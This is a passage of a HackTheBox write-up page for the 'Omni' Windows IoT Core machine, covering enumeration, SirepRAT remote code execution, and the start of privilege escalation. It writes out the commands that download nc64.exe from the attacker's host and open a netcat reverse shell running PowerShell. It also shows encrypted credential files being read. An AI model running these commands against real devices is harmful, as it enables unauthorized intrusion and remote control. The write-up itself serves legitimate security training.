@@ -1,0 +1,220 @@
+<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Omni | CyFun</title><meta name=keywords content="ctf,hackthebox,penetration-testing,writeup,linux,easy"><meta name=description content="Omni HackTheBox writeup"><meta name=author content="s4ch"><link rel=canonical href=https://s4ch.github.io/writeups/hackthebox/omni/><link crossorigin=anonymous href=/assets/css/stylesheet.c5de734fbd88c3d21543485ffbcb1ccdda89a86a780cf987fa00199c41dbc947.css integrity="sha256-xd5zT72Iw9IVQ0hf+8sczdqJqGp4DPmH+gAZnEHbyUc=" rel="preload stylesheet" as=style><link rel=icon href=https://s4ch.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://s4ch.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://s4ch.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://s4ch.github.io/apple-touch-icon.png><link rel=mask-icon href=https://s4ch.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://s4ch.github.io/writeups/hackthebox/omni/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Omni "><meta property="og:description" content="Omni HackTheBox writeup"><meta property="og:type" content="article"><meta property="og:url" content="https://s4ch.github.io/writeups/hackthebox/omni/"><meta property="og:image" content="https://s4ch.github.io/writeups/hackthebox/omni/omni.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2021-01-31T18:01:00+00:00"><meta property="article:modified_time" content="2025-08-18T17:55:49+05:30"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/tenet/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/scriptkiddie/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/delivery/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/ready/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/laboratory/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/passage/"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://s4ch.github.io/writeups/hackthebox/omni/omni.png"><meta name=twitter:title content="Omni "><meta name=twitter:description content="Omni HackTheBox writeup"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://s4ch.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"HackTheBox Writeups","item":"https://s4ch.github.io/writeups/hackthebox/"},{"@type":"ListItem","position":3,"name":"Omni ","item":"https://s4ch.github.io/writeups/hackthebox/omni/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Omni ","name":"Omni ","description":"Omni HackTheBox writeup","keywords":["ctf","hackthebox","penetration-testing","writeup","linux","easy"],"articleBody":"Information Name: Omni Profile: www.hackthebox.eu Difficulty: Easy OS: Other Points: 20 Overview Install tools used in this WU on BlackArch Linux:\n$ pacman -S nmap windows-binaries $ pikaur -S powershell-bin Network enumeration Port \u0026 service discovery scan with nmap:\n# Nmap 7.80 scan initiated Tue Oct 13 20:58:56 2020 as: nmap -sSVC -p- -oA nmap_full -v 10.10.10.204 Nmap scan report for 10.10.10.204 Host is up (0.023s latency). Not shown: 65529 filtered ports PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 5985/tcp open upnp Microsoft IIS httpd 8080/tcp open upnp Microsoft IIS httpd | http-auth: | HTTP/1.1 401 Unauthorized\\x0D |_ Basic realm=Windows Device Portal |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Site doesn't have a title. 29817/tcp open unknown 29819/tcp open arcserve ARCserve Discovery 29820/tcp open unknown 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port29820-TCP:V=7.80%I=7%D=10/13%Time=5F85F960%P=x86_64-unknown-linux-g SF:nu%r(NULL,10,\"\\*LY\\xa5\\xfb`\\x04G\\xa9m\\x1c\\xc9}\\xc8O\\x12\")%r(GenericLine SF:s,10,\"\\*LY\\xa5\\xfb`\\x04G\\xa9m\\x1c\\xc9}\\xc8O\\x12\")%r(Help,10,\"\\*LY\\xa5\\x SF:fb`\\x04G\\xa9m\\x1c\\xc9}\\xc8O\\x12\")%r(JavaRMI,10,\"\\*LY\\xa5\\xfb`\\x04G\\xa9m SF:\\x1c\\xc9}\\xc8O\\x12\"); Service Info: Host: PING; OS: Windows; CPE: cpe:/o:microsoft:windows Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Oct 13 21:01:54 2020 -- 1 IP address (1 host up) scanned in 177.87 seconds At first glance this looks like a classic Windows, but remember the box type is not Windows but other.\nOn port 8080, look at the Basic Auth realm: Windows Device Portal.\nThe Windows Device Portal is often used for Windows 10 IoT.\nHTTP discovery We can try the default Windows 10 IoT Dashboard credentials on the Windows Device Portal but this doesn’t work.\nUsername: `Administrator` Password: `p@ssw0rd` Vulnerability search Let’s search for Windows IoT Core vulnerabilities.\nNew exploit lets attackers take control of Windows IoT Core devices Windows IoT Core exploitable via ethernet Windows 10 IoT Core Test Interface Lets Attackers Take Over Devices SafeBreach Labs Discloses New Microsoft Windows IoT Core Weakness and Exploit We can also read the Windows IoT Core: RCE as System PDF paper from SafeBreach.\nThey also produced a tool to exploit the vulnerability called SirepRAT.\nExploitation: RCE Let’s install a virtual python environment to avoid messing with our system libraries when installing the dependencies of the tool. Also even if the tool was released in 2019 the author (dorazouri) had the bad idea to develop in with the long time deprecated python 2. So let’s install a deprecated python 2 environment.\n$ asdf install python 2.7.18 $ asdf local python 2.7.18 $ asdf current python python 2.7.18 /home/cyfun/CTF/HackTheBox/machines/Omni/.tool-versions $ git clone https://github.com/SafeBreach-Labs/SirepRAT.git $ cd SirepRAT $ pip2 install -r requirements.txt Because we are in the virtual environment, our default python is now the deprecated python 2 instead of python 3.\n$ python --version Python 2.7.18 So we can now executed the tool:\n$ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd \"C:\\Windows\\System32\\hostname.exe\" ","wordCount":"1333","inLanguage":"en","image":"https://s4ch.github.io/writeups/hackthebox/omni/omni.png","datePublished":"2021-01-31T18:01:00Z","dateModified":"2025-08-18T17:55:49+05:30","author":{"@type":"Person","name":"s4ch"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://s4ch.github.io/writeups/hackthebox/omni/"},"publisher":{"@type":"Organization","name":"CyFun","logo":{"@type":"ImageObject","url":"https://s4ch.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://s4ch.github.io/ accesskey=h title="CyFun (Alt + H)">CyFun</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)">
+<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
+<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://s4ch.github.io/about/ title=About><span>About</span></a></li><li><a href=https://s4ch.github.io/archives title=Blog><span>Blog</span></a></li><li><a href=https://s4ch.github.io/contact/ title=Contact><span>Contact</span></a></li><li><a href=https://s4ch.github.io/writeups/ title=Writeups><span>Writeups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">Omni</h1><div class=post-description>Omni HackTheBox writeup</div><div class=post-meta><span title='2021-01-31 18:01:00 +0000 UTC'>January 31, 2021</span>&nbsp;·&nbsp;7 min&nbsp;·&nbsp;1333 words&nbsp;·&nbsp;s4ch</div></header><figure class=entry-cover><img loading=eager src=https://s4ch.github.io/writeups/hackthebox/omni/omni.png alt="Omni HackTheBox Machine"><p>Omni - Easy Linux Machine</p></figure><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#overview>Overview</a></li><li><a href=#network-enumeration>Network enumeration</a></li><li><a href=#http-discovery>HTTP discovery</a></li><li><a href=#vulnerability-search>Vulnerability search</a></li><li><a href=#exploitation-rce>Exploitation: RCE</a></li><li><a href=#deploying-a-reverse-shell>Deploying a reverse shell</a></li><li><a href=#privilege-escalation--stage-1>Privilege Escalation : stage 1</a></li><li><a href=#system-enumeration-with-powershell>System enumeration with Powershell</a></li><li><a href=#privilege-escalation--stage-2>Privilege Escalation : stage 2</a></li></ul></nav></div></details></div><div class=post-content><h1 id=information>Information<a hidden class=anchor aria-hidden=true href=#information>#</a></h1><ul><li><strong>Name:</strong> Omni</li><li><strong>Profile:</strong> <a href=https://www.hackthebox.eu/home/machines/profile/271>www.hackthebox.eu</a></li><li><strong>Difficulty:</strong> Easy</li><li><strong>OS:</strong> Other</li><li><strong>Points:</strong> 20</li></ul><h2 id=overview>Overview<a hidden class=anchor aria-hidden=true href=#overview>#</a></h2><p>Install tools used in this WU on BlackArch Linux:</p><pre tabindex=0><code>$ pacman -S nmap windows-binaries
+$ pikaur -S powershell-bin
+</code></pre><h2 id=network-enumeration>Network enumeration<a hidden class=anchor aria-hidden=true href=#network-enumeration>#</a></h2><p>Port & service discovery scan with nmap:</p><pre tabindex=0><code># Nmap 7.80 scan initiated Tue Oct 13 20:58:56 2020 as: nmap -sSVC -p- -oA nmap_full -v 10.10.10.204
+Nmap scan report for 10.10.10.204
+Host is up (0.023s latency).
+Not shown: 65529 filtered ports
+PORT      STATE SERVICE  VERSION
+135/tcp   open  msrpc    Microsoft Windows RPC
+5985/tcp  open  upnp     Microsoft IIS httpd
+8080/tcp  open  upnp     Microsoft IIS httpd
+| http-auth:
+| HTTP/1.1 401 Unauthorized\x0D
+|_  Basic realm=Windows Device Portal
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Site doesn&#39;t have a title.
+29817/tcp open  unknown
+29819/tcp open  arcserve ARCserve Discovery
+29820/tcp open  unknown
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port29820-TCP:V=7.80%I=7%D=10/13%Time=5F85F960%P=x86_64-unknown-linux-g
+SF:nu%r(NULL,10,&#34;\*LY\xa5\xfb`\x04G\xa9m\x1c\xc9}\xc8O\x12&#34;)%r(GenericLine
+SF:s,10,&#34;\*LY\xa5\xfb`\x04G\xa9m\x1c\xc9}\xc8O\x12&#34;)%r(Help,10,&#34;\*LY\xa5\x
+SF:fb`\x04G\xa9m\x1c\xc9}\xc8O\x12&#34;)%r(JavaRMI,10,&#34;\*LY\xa5\xfb`\x04G\xa9m
+SF:\x1c\xc9}\xc8O\x12&#34;);
+Service Info: Host: PING; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Tue Oct 13 21:01:54 2020 -- 1 IP address (1 host up) scanned in 177.87 seconds
+</code></pre><p>At first glance this looks like a classic Windows, but remember the box type
+is not <em>Windows</em> but <em>other</em>.</p><p>On port 8080, look at the Basic Auth realm: <em>Windows Device Portal</em>.</p><p>The <a href=https://docs.microsoft.com/en-us/windows/iot-core/manage-your-device/deviceportal>Windows Device Portal</a>
+is often used for <em>Windows 10 IoT</em>.</p><h2 id=http-discovery>HTTP discovery<a hidden class=anchor aria-hidden=true href=#http-discovery>#</a></h2><p>We can try the default <a href=https://docs.microsoft.com/en-us/windows/iot-core/connect-your-device/iotdashboard>Windows 10 IoT Dashboard</a> credentials on the <a href=https://docs.microsoft.com/en-us/windows/iot-core/manage-your-device/deviceportal>Windows Device Portal</a>
+but this doesn&rsquo;t work.</p><pre tabindex=0><code>Username: `Administrator`
+Password: `p@ssw0rd`
+</code></pre><h2 id=vulnerability-search>Vulnerability search<a hidden class=anchor aria-hidden=true href=#vulnerability-search>#</a></h2><p>Let&rsquo;s search for Windows IoT Core vulnerabilities.</p><ul><li><a href=https://www.zdnet.com/article/new-exploit-lets-attackers-take-control-of-windows-iot-core-devices/>New exploit lets attackers take control of Windows IoT Core devices</a></li><li><a href=https://nakedsecurity.sophos.com/2019/03/05/windows-iot-exploit-permits-directly-connected-device-pwnage/>Windows IoT Core exploitable via ethernet</a></li><li><a href=https://www.bleepingcomputer.com/news/security/windows-10-iot-core-test-interface-lets-attackers-take-over-devices/>Windows 10 IoT Core Test Interface Lets Attackers Take Over Devices</a></li><li><a href=https://safebreach.com/Post/SafeBreach-Labs-Discloses-New-Microsoft-Windows-IoT-Core-Weakness-and-Exploit>SafeBreach Labs Discloses New Microsoft Windows IoT Core Weakness and Exploit</a></li></ul><p>We can also read the <a href=https://github.com/SafeBreach-Labs/SirepRAT/blob/master/docs/SirepRAT_RCE_as_SYSTEM_on_Windows_IoT_Core_White_Paper.pdf>Windows IoT Core: RCE as System</a> PDF paper from SafeBreach.</p><p>They also produced a tool to exploit the vulnerability called <a href=https://github.com/SafeBreach-Labs/SirepRAT>SirepRAT</a>.</p><h2 id=exploitation-rce>Exploitation: RCE<a hidden class=anchor aria-hidden=true href=#exploitation-rce>#</a></h2><p>Let&rsquo;s install a virtual python environment to avoid messing with our system
+libraries when installing the dependencies of the tool.
+Also even if the tool was released in 2019 the author (dorazouri) had the bad
+idea to develop in with the long time deprecated python 2. So let&rsquo;s install
+a deprecated python 2 environment.</p><pre tabindex=0><code>$ asdf install python 2.7.18
+$ asdf local python 2.7.18
+$ asdf current python
+python          2.7.18           /home/cyfun/CTF/HackTheBox/machines/Omni/.tool-versions
+</code></pre><pre tabindex=0><code>$ git clone https://github.com/SafeBreach-Labs/SirepRAT.git
+$ cd SirepRAT
+$ pip2 install -r requirements.txt
+</code></pre><p>Because we are in the virtual environment, our default python is now the deprecated
+python 2 instead of python 3.</p><pre tabindex=0><code>$ python --version
+Python 2.7.18
+</code></pre><p>So we can now executed the tool:</p><pre tabindex=0><code>$ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd &#34;C:\Windows\System32\hostname.exe&#34;
+&lt;HResultResult | type: 1, payload length: 4, HResult: 0x0&gt;
+&lt;OutputStreamResult | type: 11, payload length: 6, payload peek: &#39;omni&#39;&gt;
+&lt;ErrorStreamResult | type: 12, payload length: 4, payload peek: &#39;&#39;&gt;
+</code></pre><p>The RCE works, we retrieved the hostname.</p><h2 id=deploying-a-reverse-shell>Deploying a reverse shell<a hidden class=anchor aria-hidden=true href=#deploying-a-reverse-shell>#</a></h2><p>We can&rsquo;t use classis LOLBAS like certutils for downloading but we can still use powershell.</p><p>We can use one of those <a href=https://blog.jourdant.me/post/3-ways-to-download-files-with-powershell>three methods</a>:</p><ol><li>Invoke-WebRequest</li><li>System.Net.WebClient</li><li>Start-BitsTransfer</li></ol><p>So let&rsquo;s use <code>Invoke-WebRequest</code> to download a binary served by our one-line ruby HTTP server:</p><pre tabindex=0><code>$ ruby -run -ehttpd /usr/share/windows/windows-binaries/ -p9999
+[2020-10-13 22:46:52] INFO  WEBrick 1.6.0
+[2020-10-13 22:46:52] INFO  ruby 2.7.2 (2020-10-01) [x86_64-linux]
+[2020-10-13 22:46:52] INFO  WEBrick::HTTPServer#start: pid=53742 port=9999
+</code></pre><p>PS: It&rsquo;s no use to try a meterpreter or any MSF reverse shell are they will be
+a good chance that Windows Defender will block it since we&rsquo;re on Windows 10.
+So let&rsquo;s use ncat instead.</p><pre tabindex=0><code>$ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd &#34;C:\Windows\System32\cmd.exe&#34; --args &#34; /c powershell Invoke-Webrequest -OutFile C:\Windows\temp\ncat.exe -Uri http://10.10.14.173:9999/ncat.exe&#34;
+&lt;HResultResult | type: 1, payload length: 4, HResult: 0x0&gt;
+</code></pre><p>Launching the ncat I had a compatibility error. Let&rsquo;s check the architecture:</p><pre tabindex=0><code>$ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd &#34;C:\Windows\System32\cmd.exe&#34; --args &#39; /c powershell $env:PROCESSOR_ARCHITECTURE&#39;
+&lt;HResultResult | type: 1, payload length: 4, HResult: 0x0&gt;
+&lt;OutputStreamResult | type: 11, payload length: 7, payload peek: &#39;AMD64&#39;&gt;
+&lt;ErrorStreamResult | type: 12, payload length: 4, payload peek: &#39;&#39;&gt;
+</code></pre><p>I haven&rsquo;t found any pre-compiled version of ncat for Windows 64 bits so I
+downloaded a <a href=https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip>64 bits version of netcat (nc)</a>.</p><p>So I uploaded the 64 bits version the same way and executed it:</p><pre tabindex=0><code>$ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd &#34;C:\Windows\System32\cmd.exe&#34; --args &#34; /c C:\Windows\temp\nc64.exe 10.10.14.173 9999 -e powershell&#34;
+</code></pre><p>I was able to receive the reverse shell:</p><pre tabindex=0><code>$ pwncat -l 9999 -vv
+INFO: Listening on :::9999 (family 10/IPv6, TCP)
+INFO: Listening on 0.0.0.0:9999 (family 2/IPv4, TCP)
+INFO: Client connected from 10.10.10.204:49689 (family 2/IPv4, TCP)
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\windows\system32&gt;
+</code></pre><h2 id=privilege-escalation--stage-1>Privilege Escalation : stage 1<a hidden class=anchor aria-hidden=true href=#privilege-escalation--stage-1>#</a></h2><p>We are logged as omni and we can list other accounts available:</p><pre tabindex=0><code>PS C:\windows\system32&gt; echo $env:UserName
+omni$
+
+PS C:\windows\system32&gt; ls C:\Data\Users
+
+    Directory: C:\Data\Users
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----         7/4/2020   9:48 PM                administrator
+d-----         7/4/2020   9:53 PM                app
+d-----         7/3/2020  11:22 PM                DefaultAccount
+d-----         7/3/2020  11:22 PM                DevToolsUser
+d-r---       10/13/2020  12:08 PM                Public
+d-----         7/4/2020  10:29 PM                System
+</code></pre><p>Let&rsquo;s browse their directories:</p><pre tabindex=0><code>PS C:\windows\system32&gt; gc C:\Data\Users\app\user.txt
+&lt;Objs Version=&#34;1.1.0.1&#34; xmlns=&#34;http://schemas.microsoft.com/powershell/2004/04&#34;&gt;
+  &lt;Obj RefId=&#34;0&#34;&gt;
+    &lt;TN RefId=&#34;0&#34;&gt;
+      &lt;T&gt;System.Management.Automation.PSCredential&lt;/T&gt;
+      &lt;T&gt;System.Object&lt;/T&gt;
+    &lt;/TN&gt;
+    &lt;ToString&gt;System.Management.Automation.PSCredential&lt;/ToString&gt;
+    &lt;Props&gt;
+      &lt;S N=&#34;UserName&#34;&gt;flag&lt;/S&gt;
+      &lt;SS N=&#34;Password&#34;&gt;01000000d08c9ddf0115d1118c7a00c04fc297eb010000009e131d78fe272140835db3caa288536400000000020000000000106600000001000020000000ca1d29ad4939e04e514d26b9706a29aa403cc131a863dc57d7d69ef398e0731a000000000e800000000200002
+0000000eec9b13a75b6fd2ea6fd955909f9927dc2e77d41b19adde3951ff936d4a68ed750000000c6cb131e1a37a21b8eef7c34c053d034a3bf86efebefd8ff075f4e1f8cc00ec156fe26b4303047cee7764912eb6f85ee34a386293e78226a766a0e5d7b745a84b8f839dacee4fe6ffb6bb1cb53146c6340000000e3a43dfe678e3c6fc196e434106f1207e25c3b3b0ea37bd9e779cdd92bd44be23aaea507b6cf2b614c7c2e71d211990af0986d008a36c133c36f4da2f9406ae7&lt;/SS&gt;
+    &lt;/Props&gt;
+  &lt;/Obj&gt;
+&lt;/Objs&gt;
+
+PS C:\windows\system32&gt; gc C:\Data\Users\administrator\root.txt
+&lt;Objs Version=&#34;1.1.0.1&#34; xmlns=&#34;http://schemas.microsoft.com/powershell/2004/04&#34;&gt;
+  &lt;Obj RefId=&#34;0&#34;&gt;
+    &lt;TN RefId=&#34;0&#34;&gt;
+      &lt;T&gt;System.Management.Automation.PSCredential&lt;/T&gt;
+      &lt;T&gt;System.Object&lt;/T&gt;
+    &lt;/TN&gt;
+    &lt;ToString&gt;System.Management.Automation.PSCredential&lt;/ToString&gt;
+    &lt;Props&gt;
+      &lt;S N=&#34;UserName&#34;&gt;flag&lt;/S&gt;
+      &lt;SS N=&#34;Password&#34;&gt;01000000d08c9ddf0115d1118c7a00c04fc297eb0100000011d9a9af9398c648be30a7dd764d1f3a000000000200000000001066000000010000200000004f4016524600b3914d83c0f88322cbed77ed3e3477dfdc9df1a2a5822021439b000000000e8000000002000020000000dd198d09b343e3b6fcb9900b77eb64372126aea207594bbe5bb76bf6ac5b57f4500000002e94c4a2d8f0079b37b33a75c6ca83efadabe077816aa2221ff887feb2aa08500f3cf8d8c5b445ba2815c5e9424926fca73fb4462a6a706406e3fc0d148b798c71052fc82db4c4be29ca8f78f0233464400000008537cfaacb6f689ea353aa5b44592cd4963acbf5c2418c31a49bb5c0e76fcc3692adc330a85e8d8d856b62f35d8692437c2f1b40ebbf5971cd260f738dada1a7&lt;/SS&gt;
+    &lt;/Props&gt;
+  &lt;/Obj&gt;
+&lt;/Objs&gt;
+
+PS C:\windows\system32&gt; gc C:\Data\Users\app\iot-admin.xml
+gc C:\Data\Users\app\iot-admin.xml
+&lt;Objs Version=&#34;1.1.0.1&#34; xmlns=&#34;http://schemas.microsoft.com/powershell/2004/04&#34;&gt;
+  &lt;Obj RefId=&#34;0&#34;&gt;
+    &lt;TN RefId=&#34;0&#34;&gt;
+      &lt;T&gt;System.Management.Automation.PSCredential&lt;/T&gt;
+      &lt;T&gt;System.Object&lt;/T&gt;
+    &lt;/TN&gt;
+    &lt;ToString&gt;System.Management.Automation.PSCredential&lt;/ToString&gt;
+    &lt;Props&gt;
+      &lt;S N=&#34;UserName&#34;&gt;omni\administrator&lt;/S&gt;
+      &lt;SS N=&#34;Password&#34;&gt;01000000d08c9ddf0115d1118c7a00c04fc297eb010000009e131d78fe272140835db3caa28853640000000002000000000010660000000100002000000000855856bea37267a6f9b37f9ebad14e910d62feb252fdc98a48634d18ae4ebe000000000e80000000020000200000000648cd59a0cc43932e3382b5197a1928ce91e87321c0d3d785232371222f554830000000b6205d1abb57026bc339694e42094fd7ad366fe93cbdf1c8c8e72949f56d7e84e40b92e90df02d635088d789ae52c0d640000000403cfe531963fc59aa5e15115091f6daf994d1afb3c2643c945f2f4b8f15859703650f2747a60cf9e70b56b91cebfab773d0ca89a57553ea1040af3ea3085c27&lt;/SS&gt;
+    &lt;/Props&gt;
+  &lt;/Obj&gt;
+&lt;/Objs&gt;
+</code></pre><p>We got the flags but they are encrypted in PSCredential objects.</p><p>I seems we will be bale to decrypt them with <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/import-clixml?view=powershell-7">Import-Clixml</a> to <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/import-clixml?view=powershell-7#example-2--import-a-secure-credential-object">Import a secure credential object</a>.</p><ul><li><a href=https://www.travisgan.com/2015/06/powershell-password-encryption.html>Powershell Password Encryption & Decryption</a></li><li><a href=https://mcpmag.com/articles/2017/07/20/save-and-read-sensitive-data-with-powershell.aspx>How To Save and Read Sensitive Data with PowerShell</a></li></ul><p>But to do that we&rsquo;ll need to be logged as the target user or at least know
+their credentials.</p><h2 id=system-enumeration-with-powershell>System enumeration with Powershell<a hidden class=anchor aria-hidden=true href=#system-enumeration-with-powershell>#</a></h2><p>Rather than using the long options of <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-childitem?view=powershell-7">get-childitem</a>, I wanted to use the short aliases, so here is a command
+I found on StackOverflow to list the parameter aliases:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>PS /home/cyfun&gt; Get-Command get-childitem |
+</span></span><span style=display:flex><span>&gt;&gt;     ForEach-Object {$_.parameters |
+</span></span><span style=display:flex><span>&gt;&gt;         ForEach-Object { $_.Values |
+</span></span><span style=display:flex><span>&gt;&gt;             Where-Object {
+</span></span><span style=display:flex><span>&gt;&gt;                 $_.Aliases.Count <span style=color:#f92672>-gt</span> <span style=color:#ae81ff>0</span> } |
+</span></span><span style=display:flex><span>&gt;&gt;                 Select-Object Name, Aliases
+</span></span><span style=display:flex><span>&gt;&gt;             }
+</span></span><span style=display:flex><span>&gt;&gt;     }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Name                Aliases
+</span></span><span style=display:flex><span>----                -------
+</span></span><span style=display:flex><span>LiteralPath         {PSPath, LP}
+</span></span><span style=display:flex><span>Recurse             {s}
+</span></span><span style=display:flex><span>Verbose             {vb}
+</span></span><span style=display:flex><span>Debug               {db}
+</span></span><span style=display:flex><span>ErrorAction         {ea}
+</span></span><span style=display:flex><span>WarningAction       {wa}
+</span></span><span style=display:flex><span>InformationAction   {infa}
+</span></span><span style=display:flex><span>ErrorVariable       {ev}
+</span></span><span style=display:flex><span>WarningVariable     {wv}
+</span></span><span style=display:flex><span>InformationVariable {iv}
+</span></span><span style=display:flex><span>OutVariable         {ov}
+</span></span><span style=display:flex><span>OutBuffer           {ob}
+</span></span><span style=display:flex><span>PipelineVariable    {pv}
+</span></span><span style=display:flex><span>Directory           {ad, d}
+</span></span><span style=display:flex><span>File                {af}
+</span></span><span style=display:flex><span>Hidden              {ah, h}
+</span></span><span style=display:flex><span>ReadOnly            {ar}
+</span></span><span style=display:flex><span>System              {as}
+</span></span></code></pre></div><p>Here is the long and the short way to write a recursive find equivalent for
+Windows in Powershell:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>$ Get-ChildItem -Path c:\ -Recurse -ErrorAction SilentlyContinue -Force -Filter *.vbs
+</span></span><span style=display:flex><span>$ gci -Path c:\ -s -ea SilentlyContinue -Force -Filter *.vbs
+</span></span></code></pre></div><p>Found no interesting VBS scripts, so let&rsquo;s find bat scripts instead.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>$ gci -Path c:\ -s -ea SilentlyContinue -Force -Filter *.bat
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    Directory<span style=color:#960050;background-color:#1e0010>:</span> C:\Program Files\WindowsPowerShell\Modules\PackageManagement
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Mode                LastWriteTime         Length Name
+</span></span><span style=display:flex><span>----                -------------         ------ ----
+</span></span><span style=display:flex><span>-a-h--        <span style=color:#ae81ff>8</span>/<span style=color:#ae81ff>21</span>/<span style=color:#ae81ff>2020</span>  <span style=color:#ae81ff>12</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>56</span> PM            <span style=color:#ae81ff>247</span> r.bat
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    Directory<span style=color:#960050;background-color:#1e0010>:</span> C:\Program Files\WindowsPowerShell\Modules\Pester\<span style=color:#ae81ff>3.4</span>.0
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Mode                LastWriteTime         Length Name
+</span></span><span style=display:flex><span>----                -------------         ------ ----
+</span></span><span style=display:flex><span>-a----       <span style=color:#ae81ff>10</span>/<span style=color:#ae81ff>26</span>/<span style=color:#ae81ff>2018</span>  <span style=color:#ae81ff>11</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>36</span> PM            <span style=color:#ae81ff>744</span> Build.bat
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    Directory<span style=color:#960050;background-color:#1e0010>:</span> C:\Program Files\WindowsPowerShell\Modules\Pester\<span style=color:#ae81ff>3.4</span>.<span style=color:#ae81ff>0</span>\bin
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Mode                LastWriteTime         Length Name
+</span></span><span style=display:flex><span>----                -------------         ------ ----
